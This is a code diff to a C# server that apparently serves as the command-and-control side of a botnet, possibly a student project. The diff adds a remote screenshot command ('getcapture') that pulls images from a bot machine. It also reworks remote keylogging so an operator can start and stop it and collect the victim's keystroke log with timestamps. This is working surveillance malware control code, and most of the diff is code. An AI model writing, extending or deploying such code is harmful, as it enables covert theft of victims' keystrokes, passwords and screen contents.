@@ -31,7 +31,11 @@ namespace Server
         public static string[] commandBot = new string[5];
         public static string[] preBotActive = new string[5];
         public static string[] preCommandBot = new string[5];
-        static Boolean isFinished = true;       
+        static Boolean isFinished = true;
+
+        private static DateTime timeStart;
+        private static DateTime timeStop;
+
         public static void sendMessageSocket(string message, Socket socket)
         {
             if (socket.Connected)
@@ -71,7 +75,6 @@ namespace Server
                 {
                     if (fileInfo1.Length == 0 || fileInfo2.Length == 0)
                     {
-                        Console.WriteLine("Khong mo dc file");
                         continue;
                     }                   
                 }
@@ -144,12 +147,31 @@ namespace Server
                 //
                 //Console.WriteLine(detail);
             }
+            else if (command == "getcapture")
+            {
+                string ms = "capture" + "ulatroi";
+                sendMessageSocket(ms, clientSelected.Client);
+                receiveFileSocket(clientSelected, "capture");
+                readFile(id, "capture", detail);
+                //
+                //Console.WriteLine(detail);
+            }
             else if (command == "getkeylogger")
             {
-                sendMessageSocket("keylogger", clientSelected.Client);
-                Console.WriteLine("Sending request get keylogger...");
-                receiveFileSocket(clientSelected, "keylogger");
-                Console.WriteLine("Receive keylogger complete!");
+                string ms = "keylogger?" + detail + "?" ;
+                if (detail=="start keylogger")
+                {
+                    timeStart = DateTime.Now;
+                    sendMessageSocket(ms, clientSelected.Client);
+                }
+                else if (detail == "stop keylogger")
+                {
+                    timeStop = DateTime.Now;
+                    sendMessageSocket(ms, clientSelected.Client);
+                    receiveFileSocket(clientSelected, "keylogger");
+                    String time = timeStart.ToString() + "?" + timeStop.ToString() + "?";
+                    readFile(id, "keylogger", time); // detail thay bằng time
+                }
             }
             //else if (command == "read keylogger")
             //{
@@ -188,16 +210,17 @@ namespace Server
             }
             else if (type == "keylogger")
             {
+                //Console.WriteLine("Nhan file thanh cong");
                 fileName = "getkeylogger.txt";
             }
             else if (type == "cmd")
             {
                 fileName = "getcmd.txt";
             }
-            //else if (type == "capture")
-            //{
-            //    fileName = "getcapture.txt";
-            //}
+            else if (type == "capture")
+            {
+                fileName = "getcapture.png";
+            }
             if (!client.Connected)
             {
                 return;
@@ -240,29 +263,40 @@ namespace Server
             }
             else if (type == "keylogger")
             {
+                //Console.WriteLine("Doc file thanh cong");
                 fileName = "getkeylogger.txt";
             }
             else if (type == "cmd")
             {
                 fileName = "getcmd.txt";
             }
+            else if (type == "capture")
+            {
+                fileName = "getcapture.png";
+            }
 
             string rs = "";
 
             if (File.Exists(fileName))
             {
-                string[] lines = File.ReadAllLines(fileName);
-
-                foreach (string line in lines)
+                if (type != "capture")
                 {
-                    rs += line + "\n";
+                    string[] lines = File.ReadAllLines(fileName);
+                    foreach (string line in lines)
+                    {
+                        rs += line + "\n";
+                    }
                 }
             }
             else
             {
                 rs = "The file " + fileName + " does not exist\n You need get " + fileName + " from botnet\n";
             }
-            AddFile.addNewFile(id, type, detail, rs);
+            if ( type == "capture")
+            {
+                AddFile.addNewFile(id, type, detail, "F:\\PBL4\\Code\\Server\\PBL4\\bin\\Debug\\getcapture.png");
+            }
+            else AddFile.addNewFile(id, type, detail, rs);
 
         }
         static void Main(string[] args)
